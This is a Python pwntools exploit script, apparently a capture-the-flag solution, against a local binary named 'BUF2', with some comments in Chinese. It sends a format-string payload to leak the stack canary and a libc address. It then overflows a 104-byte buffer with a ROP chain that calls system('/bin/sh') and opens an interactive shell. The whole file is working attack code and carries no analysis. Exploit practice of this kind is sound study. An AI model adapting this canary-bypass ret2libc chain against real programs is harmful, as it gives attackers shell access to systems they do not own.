#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./BUF2')
libc = ELF('./libc.so.6')
elf = ELF('./BUF2')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.recvuntil("Please pwn me :)\n")
p.recvuntil("Enter your data:\n")
payload = "%p."*25 + "A"*29 # buf 所占栈空间长度为 104
p.sendline(payload) # sendline() 会在 payload 后面追加一个换行符 '\n' 对应的十六进制就是 0xa

data = p.recv(400)
print(data)

p.recvuntil('A'*29)
canary = u64(p.recv(8).ljust(8, "\x00")) - 0xa
libcbase = int(data[21:35],16) - 0x114992
do_system = libcbase + 0x50d7b # <system+27>    call   do_system
binsh_addr = libcbase + next(libc.search(b"/bin/sh"))
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret

pr('canary',canary)
pr('libcbase ',libcbase)
pr('do_system',do_system)

#gdb.attach(p)
#pause()
p.recvuntil("Input your buf data:\n")
payload  = "A"*104 + p64(canary) +  p64(0)
payload += p64(prdi_ret) + p64(binsh_addr)
payload += p64(do_system)

p.send(payload)
p.recv()
p.interactive()